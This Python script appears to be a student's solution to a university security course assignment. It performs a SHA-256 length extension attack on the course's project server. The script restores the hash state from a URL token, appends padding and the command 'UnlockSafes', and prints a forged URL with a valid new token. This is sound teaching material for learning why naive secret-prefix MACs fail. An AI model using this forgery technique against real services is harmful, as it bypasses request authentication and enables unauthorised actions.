#!/usr/bin/python3

# Run me like this:
# $ python3 len_ext_attack.py "https://project1.eecs388.org/uniqname/lengthextension/api?token=...."
# or select "Length Extension" from the VS Code debugger

import sys
from urllib.parse import quote
from pysha256 import sha256, padding


class URL:
    def __init__(self, url: str):
        # prefix is the slice of the URL from "https://" to "token=", inclusive.
        self.prefix = url[:url.find('=') + 1]
        self.token = url[url.find('=') + 1:url.find('&')]
        # suffix starts at the first "command=" and goes to the end of the URL
        self.suffix = url[url.find('&') + 1:]

    def __str__(self) -> str:
        return f'{self.prefix}{self.token}&{self.suffix}'

    def __repr__(self) -> str:
        return f'{type(self).__name__}({str(self).__repr__()})'


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)
        sys.exit(-1)

    url = URL(sys.argv[1])

    #
    #TODO
    # Extract components from the URL object
    # The part of the URL up to 'token='
    prefix = url.prefix
    # The token part in the URL    
    token = url.token   
    # Everything after the token  
    suffix = url.suffix   

    # The secret used in the hash is 8 bytes long
    secret_length = 8
    original_message = suffix  
     # Total length includes the secret
    original_message_length = secret_length + len(original_message) 

    # Calculate the padding we need to align the message length for SHA-256
    pad = padding(original_message_length)

    # Define the new command we want to add to the URL which is unlock safes
    new_command = "&command=UnlockSafes"

    # Convert the original token from hexadecimal to bytes
    original_hash_bytes = bytes.fromhex(token)

    # Create a new SHA-256 hash object with the internal state set to the original token's hash
    # I usedd the practice code to create this argument
    h2 = sha256(
        state=original_hash_bytes,
        count=(original_message_length + len(pad))  # The length in bytes of the original message + padding
    )

    # Update the hash to extend the message
    h2.update(new_command.encode('utf-8'))

    # Generate the new token after performing the length extension
    new_token = h2.hexdigest()

    # Build the new URL by appending the new token and the new command
    new_suffix = suffix + quote(pad) + new_command
    modified_url = f"{prefix}{new_token}&{new_suffix}"

    # Output the changed URL
    print(modified_url)


if __name__ == '__main__':
    main()
